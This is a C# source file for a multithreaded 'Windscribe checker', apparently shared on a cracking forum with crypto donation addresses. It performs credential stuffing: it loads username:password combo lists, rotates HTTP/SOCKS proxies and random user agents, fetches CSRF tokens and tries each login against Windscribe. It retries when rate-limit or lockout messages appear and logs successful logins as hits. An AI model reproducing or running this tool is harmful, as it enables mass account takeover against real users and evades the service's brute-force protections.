using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using Console = Colorful.Console;
using System.Windows;
using System.IO;
using System.Threading;
using Leaf.xNet;
using Leaf.xNet.Extensions;

namespace Windscribe
{
	internal class Program
	{
		static string[] Combos = null;
		static string[] Proxies = null;
		static int SelectedProxyType = 0;
		static int Threads = 50;

		static int TotalChecked = 0;
		static int ComboIndex = 0;
		static int CPM = 0;
		static int Hits = 0;
		static int Bad = 0;
		static int Errors = 0;

		static async void CPMCounter()
        {
			while (true)
            {
				await Task.Delay(10000);
				CPM = TotalChecked * 6;
				TotalChecked = 0;
            }
        }

		static async void Check()
        {
			int ThreadIndex = 0;
			bool DontSkipHits = false; //If we error, we will try again (programmatically changed)
			bool NoCSRFError = true;
			Random proxIndex = new Random();

			while (true)
            {
				if (DontSkipHits == false && NoCSRFError == true)
                {
					ThreadIndex = ComboIndex;
					ComboIndex++;
				}

				if (DontSkipHits == true)
					DontSkipHits = false;

				if (NoCSRFError == false)
					NoCSRFError = true;
				
				TotalChecked++;
				if (ComboIndex > Combos.Length)
					Thread.CurrentThread.Abort();

				HttpRequest csrfReq = null;
				HttpRequest loginReq = null;
				RequestParams body = null;
				HttpResponse csrfResp = null;
				HttpResponse resp = null;

				string Combo = Combos[ThreadIndex];
				string Username = Combo.Split(':')[0];
				string Password = Combo.Split(':')[1];
				string Proxy = Proxies[proxIndex.Next(Proxies.Length)];
				string UserAgent = Http.RandomUserAgent();
				string CsrfToken = null;
				string CsrfTime = null;
				string LoginParsed = null;
				string LoginTitle = null;

				//Console.WriteLine("Using " + Proxy + " [" + ThreadIndex + "]");

				/* Get CSRF token */
				try
				{
					csrfReq = new HttpRequest();
					csrfReq.UserAgent = UserAgent;

					csrfReq.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
					csrfReq.AddHeader("accept-encoding", "gzip, deflate, br");
					csrfReq.AddHeader("accept-language", "en-US,en;q=0.9");
					csrfReq.AddHeader("cache-control", "max-age=0");
					csrfReq.AddHeader("content-type", "application/x-www-form-urlencoded");
					csrfReq.AddHeader("cookie", "ref=https%3A%2F%2Fwindscribe.com%2F; i_can_has_cookie=1; _pk_id.3.2e1e=385740fdaf2ec9a4.1650729346.1.1650729346.1650729346.");
					csrfReq.AddHeader("dnt", "1");
					csrfReq.AddHeader("origin", "https://windscribe.com");
					csrfReq.AddHeader("sec-fetch-dest", "document");
					csrfReq.AddHeader("sec-fetch-mode", "navigate");
					csrfReq.AddHeader("sec-fetch-site", "same-origin");
					csrfReq.AddHeader("sec-fetch-user", "?1");
					csrfReq.AddHeader("sec-gpc", "1");
					csrfReq.AddHeader("upgrade-insecure-requests", "1");

					if (SelectedProxyType == 1) //HTTP
						csrfReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.HTTP, Proxy);
					else if (SelectedProxyType == 2) //SOCKS4
						csrfReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks4, Proxy);
					else if (SelectedProxyType == 3) //SOCKS5
						csrfReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks5, Proxy);

					csrfResp = csrfReq.Post("https://res.windscribe.com/res/logintoken");

					CsrfToken = csrfResp.ToString().Substring("{\"csrf_token\":\"", "\",\"csrf_time\"");
					CsrfTime = csrfResp.ToString().Substring("\",\"csrf_time\":", "}");

					//Console.WriteLine(csrfResp.ToString());
					//Console.WriteLine("Token: " + CsrfToken);
					//Console.WriteLine("Time: " + CsrfTime);
				}
				catch (HttpException ex)
				{
					//Console.WriteLine("Error: " + ex.Message, Color.Red);
					Errors++;
					NoCSRFError = false;
				}
				catch (Exception ex)
				{
					//Console.WriteLine("Error: " + ex.Message, Color.Red);
					Errors++;
					NoCSRFError = false;
				}
				finally
				{
					csrfReq?.Dispose();
				}

				if (NoCSRFError == true)
                {
					/* Perform account login */
					try
					{
						loginReq = new HttpRequest();
						body = new RequestParams();

						loginReq.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
						loginReq.AddHeader("accept-encoding", "gzip, deflate, br");
						loginReq.AddHeader("accept-language", "en-US,en;q=0.9");
						loginReq.AddHeader("cache-control", "max-age=0");
						loginReq.AddHeader("content-type", "application/x-www-form-urlencoded");
						loginReq.AddHeader("cookie", "ref=https%3A%2F%2Fwindscribe.com%2F; i_can_has_cookie=1; _pk_id.3.2e1e=385740fdaf2ec9a4.1650729346.1.1650729346.1650729346.");
						loginReq.AddHeader("dnt", "1");
						loginReq.AddHeader("origin", "https://windscribe.com");
						loginReq.AddHeader("sec-fetch-dest", "document");
						loginReq.AddHeader("sec-fetch-mode", "navigate");
						loginReq.AddHeader("sec-fetch-site", "same-origin");
						loginReq.AddHeader("sec-fetch-user", "?1");
						loginReq.AddHeader("sec-gpc", "1");
						loginReq.AddHeader("upgrade-insecure-requests", "1");

						loginReq.Referer = "https://windscribe.com/";
						loginReq.UserAgent = UserAgent;

						body["login"] = "1";
						body["upgrade"] = "0";
						body["csrf_time"] = CsrfTime;
						body["csrf_token"] = CsrfToken;
						body["username"] = Username;
						body["password"] = Password;
						body["code"] = "";

						if (SelectedProxyType == 1) //HTTP
							loginReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.HTTP, Proxy);
						else if (SelectedProxyType == 2) //SOCKS4
							loginReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks4, Proxy);
						else if (SelectedProxyType == 3) //SOCKS5
							loginReq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks5, Proxy);

						resp = loginReq.Post("https://windscribe.com/login", body);


						LoginParsed = resp.ToString().Substring("<div class=\"content_message error\"><i></i>", "</div>"); //<div class="content_message error"><i></i>Could not log in with provided credentials</div>
						LoginTitle = resp.ToString().Substring("<title>", "</title>");

						if (LoginParsed == "Invalid CSRF Token" || LoginParsed == "Login attempt limit reached. Try again in a few minutes." || LoginParsed == "Rate limited, please wait before trying to login again.")
                        {
							Errors++;
							DontSkipHits = true;
                        }
						else if (LoginParsed == "Could not log in with provided credentials")
							Bad++;
						else if (LoginTitle == "My Account - Windscribe")
							Hits++;

						if (LoginTitle == "My Account - Windscribe")
							Console.WriteLine(Combo, Color.Green);

						//Console.WriteLine(LoginParsed);
					}
					catch (HttpException ex)
					{
						//Console.WriteLine("Error: " + ex.Message, Color.Red);
						Errors++;
						DontSkipHits = true;
					}
					catch (Exception ex)
					{
						//Console.WriteLine("Error: " + ex.Message, Color.Red);
						Errors++;
						DontSkipHits = true;
					}
					finally
					{
						loginReq?.Dispose();
					}
				}

				Console.Title = "[cracked.io/BigManShadox] - Windscribe Checker [CPM - " + CPM + " | Hits - " + Hits + " | Bad - " + Bad + " | Errors - " + Errors + " | " + ComboIndex + "/" + Combos.Length + "]";
			}
		}

		static async void RealMain()
        {
			MessageBox.Show("This Windscribe checker was made by Shadox. You can find the source code below.\n\nIf you paid for this software, you were sadly scammed.\n\nDonations are much appreciated!\n\nBTC: 1DWZTn48Fg5bEmbKZjg56jpEBdDPKV5arX\nMonero: 83xxWBggcJVGu1D8LM6Ym5LM8qx1kx2WVbBwBULkk1TdThvR9wc519ZTXEiV34CfcpAfEyxHTF6nxcXdDNuuMJP75kof2bJ\n\nCracked.io - https://cracked.io/BigManShadox\nSource: https://github.com/BigManShadox/windscribe-checker");

			Console.Title = "[cracked.io/BigManShadox] - Windscribe Checker [CPM - 0 | Hits - 0 | Bad - 0 | Errors - 0]";
			Console.WriteLine("Loading from combos.txt and proxies.txt...");

			Combos = File.ReadAllLines(Environment.CurrentDirectory + "\\combos.txt");
			Proxies = File.ReadAllLines(Environment.CurrentDirectory + "\\proxies.txt");

			if (Combos.Length < 1)
				Console.WriteLine("Please insert your combos in combos.txt before proceeding!", Color.Red);

			if (Proxies.Length < 1)
				Console.WriteLine("Please insert your proxies in proxies.txt before proceeding!", Color.Red);

			if (Combos.Length >= 1 && Proxies.Length >= 1)
			{
				Console.Write("Threads: ", Color.Yellow);
				Threads = Int32.Parse(Console.ReadLine());

				if (Threads == 0 || Threads > 500)
					Threads = 250;

				Console.Write("Proxy Type [1 = HTTP, 2 = SOCKS4, 3 = SOCKS5]: ", Color.Yellow);
				SelectedProxyType = Int32.Parse(Console.ReadLine());

				if (SelectedProxyType != 1 && SelectedProxyType != 2 && SelectedProxyType != 3)
                {
					Console.Clear();

					bool Incorrect = true;
					while (Incorrect)
                    {
						Console.WriteLine("Please enter a valid proxy setting [1-3]!", Color.Red);
						Console.Write("Threads: ", Color.Yellow);
						Threads = Int32.Parse(Console.ReadLine());

						if (Threads == 0 || Threads > 500)
							Threads = 250;

						Console.Write("Proxy Type [1 = HTTP, 2 = SOCKS4, 3 = SOCKS5]: ", Color.Yellow);
						SelectedProxyType = Int32.Parse(Console.ReadLine());

						if (SelectedProxyType == 1 || SelectedProxyType == 2 || SelectedProxyType == 3)
							Incorrect = false;
						else
							Console.Clear();
					}
                }

				for (int i = 0; i < Threads; i++)
				{
					ThreadStart threadStart = new ThreadStart(Check);
					Thread thread = new Thread(threadStart);
					thread.Name = i.ToString();
					thread.Start();

					await Task.Delay(10);
				}

				ThreadStart cpmTracker = new ThreadStart(CPMCounter);
				Thread cpmThread = new Thread(cpmTracker);
				cpmThread.Name = "CPMTracker";
				cpmThread.Start();
			}
		}

		static void Main(string[] args)
        {
			RealMain();
		}
	}
}
